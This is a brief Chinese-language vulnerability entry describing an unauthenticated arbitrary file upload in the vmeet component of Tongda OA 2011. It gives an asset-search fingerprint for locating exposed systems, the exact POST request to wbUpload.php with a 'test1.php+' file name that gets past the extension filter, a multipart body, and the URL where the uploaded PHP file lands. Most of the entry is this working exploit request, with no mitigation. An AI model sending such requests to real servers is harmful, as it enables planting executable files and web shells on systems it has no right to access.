# 通达OAvmeet存在前台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/vmeet/wbUpload.php?fileName=test1.php+ HTTP/1.1`
- **关键头**：`Host: 192.168.31.164`　`Content-Type: multipart/form-data; boundary=---------------------------307…`　`Content-Length: 223`

**请求体 / payload**
```
-----------------------------307456622713326098592248556830
Content-Disposition: form-data; name="Filedata"; filename="1.png"
Content-Type: image/png
123
-----------------------------307456622713326098592248556830--

上传文件路径
http://192.168.31.164/general/vmeet/wbUpload/test1.php
```

**其他**
- 通达OA vmeet存在前台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2011